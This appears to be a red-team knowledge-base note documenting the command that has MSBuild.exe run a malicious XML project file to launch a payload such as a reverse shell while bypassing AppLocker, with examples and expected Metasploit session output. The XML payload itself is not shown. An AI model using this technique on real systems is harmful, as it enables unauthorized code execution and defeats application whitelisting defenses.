---
type: command
executor: cmd
data: 'C:\Windows\Microsoft.NET\Framework\$_VERSION\MSBuild.exe $_FILENAME.xml'
output: >-
  PS C:\Windows\Tasks> C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
  msbuild_nps.xml

  Microsoft (R) Build Engine version 4.7.2053.0

  [Microsoft .NET Framework, version 4.0.30319.42000]

  Copyright (C) Microsoft Corporation. All rights reserved.


  Build started 14/11/2019 22:22:37.
platforms:
  - Windows
tags:
  - msbuild
  - execution
verified: true
validated: true
---

# msbuild-execute-xml-payload

## Command

```cmd
C:\Windows\Microsoft.NET\Framework\$_VERSION\MSBuild.exe $_FILENAME.xml
```

## Description

This command executes MSBuild.exe to build and run a malicious XML project file, embedding and launching a payload like a reverse shell while bypassing AppLocker restrictions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VERSION | .NET Framework version directory (e.g., v4.0.30319) | Yes |
| $_FILENAME | Name of the XML payload file (e.g., msbuild_nps.xml) | Yes |

## Examples

### Basic Usage

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Tasks\msbuild_nps.xml
```

### Advanced Usage

Run with verbosity: Add `/v:d` for detailed output.

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe /v:d C:\Windows\Tasks\msbuild_nps.xml
```

## Expected Output

Build engine startup and build start message; success indicated by payload execution (e.g., session in Metasploit).

## Related

- [[procedures/Windows-AppLocker-Whitelist-Bypass-Using-MSBuild]]
- [[tools/nps-payload]]
